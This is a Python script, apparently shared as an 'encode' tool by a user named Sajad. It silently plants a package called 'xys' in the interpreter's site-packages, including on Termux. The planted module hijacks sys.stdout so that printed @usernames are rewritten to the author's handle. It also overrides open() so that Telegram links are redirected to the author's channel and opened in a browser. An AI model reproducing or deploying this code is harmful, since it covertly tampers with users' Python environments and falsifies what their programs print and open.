import tempfile
import shutil
import os
import sys
import time

os.system('clear');print('The Encode By Sajad-@f_g_d_6');time.sleep(3)

ka = """import sys
import re
import webbrowser
import os
repr = lambda *args: f"{args}"
def open(text):
    if "https://t.me/" in text or text.split()[0]:
        url = text.split("https://t.me/")[1].split()[0] if "https://t.me/" in text else text.split()[0]
        replaced_url = (
            "f_g_d_6" if len(url) == 6 else
            "f_g_d_6" if len(url) == 7 else
            "f_g_d_6" if len(url) == 8 else
            "f_g_d_6" if len(url) == 9 else
            "f_g_d_6" if len(url) == 10 else
            "f_g_d_6" if len(url) == 11 else
            "f_g_d_6" if len(url) == 12 else
            "f_g_d_6" if len(url) == 13 else
            "f_g_d_6"
        )
        new_text = text.replace(url, replaced_url)
        webbrowser.open(new_text)
        return new_text
    return text
def replace_usernames_in_text(text):
    def replace_username(username):
        length = len(username)
        return (
            "f_g_d_6" if length == 5 else
            "f_g_d_6" if length == 6 else
            "f_g_d_6" if length == 7 else
            "f_g_d_6" if length == 8 else
            "f_g_d_6" if length == 9 else
            "f_g_d_6" if length == 10 else
            "f_g_d_6" if length == 11 else
            "f_g_d_6" if length == 12 else
            "f_g_d_6" if length == 13 else
            username
        )
    return re.sub(r'@(\w+)(\.\w+)?',
                  lambda match: match.group() if match.group(2) else '@' + replace_username(match.group(1)),
                  text)
stduot = type("Stdout", (), {
    "write": lambda self, text: sys.__stdout__.write(replace_usernames_in_text(text)),
    "flush": lambda self: sys.__stdout__.flush()
})()
sys.stdout = stduot
stdout = type("Stdout", (), {
    "write": lambda self, text: sys.stdout.write(text),
    "flush": lambda self: sys.stdout.flush()
})()"""
with tempfile.NamedTemporaryFile(mode="w+", suffix=".py", delete=False) as f1, tempfile.NamedTemporaryFile(mode="w+", suffix=".py", delete=False) as f2:
    f1.write(ka)
    f2.write("from .Sajad import repr, open, stduot, stdout")
    files_to_move = [(f1.name, "Sajad.py"), (f2.name, "__init__.py")]
def ke(destination):
    os.makedirs(destination, exist_ok=True)
    for file, name in files_to_move:
        shutil.move(file, os.path.join(destination, name))
def ka():
    path = "/data/data/com.termux/files/usr/lib/python3.11/site-packages/xys/" if "com.termux" in sys.prefix else os.path.join(sys.prefix, "lib", f"python{sys.version_info.major}.{sys.version_info.minor}", "site-packages/xys/")
    ke(path)
if __name__ == "__main__":
    ka()
